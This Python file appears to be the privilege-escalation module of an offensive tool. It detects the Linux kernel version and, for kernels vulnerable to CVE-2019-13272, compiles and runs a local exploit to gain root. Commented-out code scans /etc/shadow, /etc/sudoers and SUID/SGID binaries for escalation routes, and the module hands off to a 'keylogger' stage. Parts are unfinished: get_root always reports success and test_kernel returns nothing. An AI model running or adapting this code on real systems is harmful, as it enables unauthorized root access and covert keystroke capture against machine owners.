###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import os
import re
import subprocess
from packaging import version

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

# Function to check permissions
# def check_permissions(file_path):
#     read_access = os.access(file_path, os.R_OK)
#     write_access = os.access(file_path, os.W_OK)
#     return read_access and write_access

# def check_privilege_escalation():
#     if os.getuid() == 0:
#         print("Current user has root privileges!")
#         return

#     # Potential privilege escalation vectors
#     privileged_files = [
#         "/etc/passwd",
#         "/etc/shadow",
#         "/etc/sudoers",
#         "/etc/cron.d/",
#     ]

#     for file in privileged_files:
#         if os.path.exists(file):
#             print(f"Potential privilege escalation vector found: {file}")
#             if check_permissions(file):
#                 print(f"The current user has read and write permissions on: {file}")
#             else:
#                 print(
#                     f"The current user does not have read and write permissions on: {file}"
#                 )

#     # Check for SUID and SGID binaries
#     for root, dirs, files in os.walk("/"):
#         for file in files:
#             file_path = os.path.join(root, file)
#             if (
#                 os.stat(file_path).st_mode & 0o4000
#                 or os.stat(file_path).st_mode & 0o2000
#             ):
#                 print(f"Potential privilege escalation binary found: {file_path}")


# custom function to execute bash commands
# exec_bash("cat file.txt", True)
def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True, text=True)


# Check if version is between a range
def is_version_in_range(version_str, min_version, max_version):
    try:
        # Convert string representations of versions to Version objects
        ver = version.parse(version_str)
        min_ver = version.parse(min_version)
        max_ver = version.parse(max_version)

        # Check if the version is within the range
        return min_ver < ver < max_ver
    except Exception as e:
        print(f"Error in parsing version: {e}")
        return False


def search_exploit(kernel_version):
    # check for CVE-2019-13272 - PTRACE_TRACEME
    if is_version_in_range(kernel_version, "4.10", "5.1.17"):
        return "CVE-2019-13272"
    else:
        return None


# OK
def detect_kernel_version():
    kernel_version = exec_bash("cat /proc/version")
    # Extract the version number using regular expression
    match = re.search(r"version (\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+)", kernel_version)
    if match:
        detected_version = match.group(1)
    else:
        detected_version = None
        print("Couldn't identify kernel version :(")
    return detected_version


def get_root(exploit):
    if exploit == "CVE-2019-13272":
        # compile file
        exec_bash("whoami")
        exec_bash("gcc -s ../utils/cve-2019-13272.c -o exploit")
        exec_bash("./exploit")
        exec_bash("whoami")
        # execute it
        # do things as root
    print(f"exploit: {exploit}")
    return True


def test_kernel():
    # get kernel version
    kernel_version = detect_kernel_version()
    print(f"kernel_version: {kernel_version}")

    # check if version has exploit
    exploit_to_run = search_exploit(kernel_version)
    print(f"exploit_to_run: {exploit_to_run}")

    if exploit_to_run:
        is_root = get_root(exploit_to_run)
        print(f"is_root: {is_root}")
    else:
        # continue checks...
        pass

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    # things to look for:
    # kernel version
    # writable files
    next_action = ""
    data = "data"
    print("privesc module activated...")
    if test_kernel():
        print("kernel exploited")
    else:
        print("no kernel exploit available")
    # collect information
    # check_privilege_escalation()

    next_action = "keylogger"
    return data, next_action


# Find SUID files:
# find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
#
# Add new user to computer
#
# Find kernel version
# cat /proc/version
# Linux version 4.15.0-54-generic (buildd@lgw01-amd64-014) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019

# run()
